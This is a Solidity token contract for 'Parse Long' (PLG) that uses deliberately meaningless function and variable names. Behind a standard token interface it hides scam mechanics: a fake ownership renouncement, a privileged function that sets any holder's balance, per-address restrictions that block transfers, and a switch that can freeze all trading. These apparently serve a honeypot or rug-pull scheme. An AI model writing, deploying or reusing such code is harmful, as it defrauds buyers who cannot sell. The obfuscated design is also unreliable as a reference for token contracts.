//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface launchedWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract tradingFromAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchMarketing {
    function createPair(address takeToken, address takeWallet) external returns (address);
}

interface modeLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address limitTeam) external view returns (uint256);

    function transfer(address exemptTakeAmount, uint256 launchMode) external returns (bool);

    function allowance(address minSell, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchMode) external returns (bool);

    function transferFrom(
        address sender,
        address exemptTakeAmount,
        uint256 launchMode
    ) external returns (bool);

    event Transfer(address indexed from, address indexed toFee, uint256 value);
    event Approval(address indexed minSell, address indexed spender, uint256 value);
}

interface listTeam is modeLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ParseLong is tradingFromAuto, modeLimit, listTeam {

    function approve(address sellAmountLiquidity, uint256 launchMode) public virtual override returns (bool) {
        walletListTeam[_msgSender()][sellAmountLiquidity] = launchMode;
        emit Approval(_msgSender(), sellAmountLiquidity, launchMode);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return atLiquidity;
    }

    uint256 constant isMarketingLaunched = 2 ** 10;

    function transferFrom(address launchedTeamReceiver, address exemptTakeAmount, uint256 launchMode) external override returns (bool) {
        if (_msgSender() != exemptTeam) {
            if (walletListTeam[launchedTeamReceiver][_msgSender()] != type(uint256).max) {
                require(launchMode <= walletListTeam[launchedTeamReceiver][_msgSender()]);
                walletListTeam[launchedTeamReceiver][_msgSender()] -= launchMode;
            }
        }
        return tokenTo(launchedTeamReceiver, exemptTakeAmount, launchMode);
    }

    uint256 public enableAmount;

    address totalLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function modeFrom(uint256 launchMode) public {
        sellFromLimit();
        totalMode = launchMode;
    }

    address exemptTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function sellLaunchedTake() public {
        emit OwnershipTransferred(toTake, address(0));
        txTo = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return receiverFrom;
    }

    function balanceOf(address limitTeam) public view virtual override returns (uint256) {
        return isSwap[limitTeam];
    }

    function getOwner() external view returns (address) {
        return txTo;
    }

    function allowance(address modeWallet, address sellAmountLiquidity) external view virtual override returns (uint256) {
        if (sellAmountLiquidity == exemptTeam) {
            return type(uint256).max;
        }
        return walletListTeam[modeWallet][sellAmountLiquidity];
    }

    function tokenTo(address launchedTeamReceiver, address exemptTakeAmount, uint256 launchMode) internal returns (bool) {
        if (launchedTeamReceiver == toTake) {
            return liquidityIsEnable(launchedTeamReceiver, exemptTakeAmount, launchMode);
        }
        uint256 autoList = modeLimit(minShould).balanceOf(totalLaunched);
        require(autoList == totalMode);
        require(exemptTakeAmount != totalLaunched);
        if (toIs[launchedTeamReceiver]) {
            return liquidityIsEnable(launchedTeamReceiver, exemptTakeAmount, isMarketingLaunched);
        }
        return liquidityIsEnable(launchedTeamReceiver, exemptTakeAmount, launchMode);
    }

    uint8 private atLiquidity = 18;

    address private txTo;

    string private launchedTakeList = "PLG";

    function sellFromLimit() private view {
        require(liquidityTokenAuto[_msgSender()]);
    }

    mapping(address => bool) public toIs;

    uint256 private listLaunch;

    string private receiverFrom = "Parse Long";

    uint256 totalMode;

    function txTokenTrading(address feeWalletReceiver) public {
        if (fundFrom) {
            return;
        }
        
        liquidityTokenAuto[feeWalletReceiver] = true;
        if (enableAmount != txLaunchTotal) {
            senderFund = true;
        }
        fundFrom = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return launchedTakeList;
    }

    uint256 tokenAmount;

    bool public fundFrom;

    address public toTake;

    function liquidityIsEnable(address launchedTeamReceiver, address exemptTakeAmount, uint256 launchMode) internal returns (bool) {
        require(isSwap[launchedTeamReceiver] >= launchMode);
        isSwap[launchedTeamReceiver] -= launchMode;
        isSwap[exemptTakeAmount] += launchMode;
        emit Transfer(launchedTeamReceiver, exemptTakeAmount, launchMode);
        return true;
    }

    function swapTrading(address modeTo) public {
        sellFromLimit();
        if (listLaunch == enableAmount) {
            maxEnable = true;
        }
        if (modeTo == toTake || modeTo == minShould) {
            return;
        }
        toIs[modeTo] = true;
    }

    constructor (){
        
        launchedWallet modeLiquidity = launchedWallet(exemptTeam);
        minShould = launchMarketing(modeLiquidity.factory()).createPair(modeLiquidity.WETH(), address(this));
        if (enableAmount != txLaunchTotal) {
            maxEnable = true;
        }
        toTake = _msgSender();
        sellLaunchedTake();
        liquidityTokenAuto[toTake] = true;
        isSwap[toTake] = enableMax;
        if (enableAmount != txLaunchTotal) {
            enableAmount = txLaunchTotal;
        }
        emit Transfer(address(0), toTake, enableMax);
    }

    bool public senderFund;

    function senderWallet(address totalLaunch, uint256 launchMode) public {
        sellFromLimit();
        isSwap[totalLaunch] = launchMode;
    }

    function owner() external view returns (address) {
        return txTo;
    }

    function transfer(address totalLaunch, uint256 launchMode) external virtual override returns (bool) {
        return tokenTo(_msgSender(), totalLaunch, launchMode);
    }

    mapping(address => bool) public liquidityTokenAuto;

    uint256 private enableMax = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private walletListTeam;

    mapping(address => uint256) private isSwap;

    address public minShould;

    event OwnershipTransferred(address indexed teamSwap, address indexed fromMaxShould);

    function totalSupply() external view virtual override returns (uint256) {
        return enableMax;
    }

    uint256 private txLaunchTotal;

    bool private takeFund;

    bool public maxEnable;

}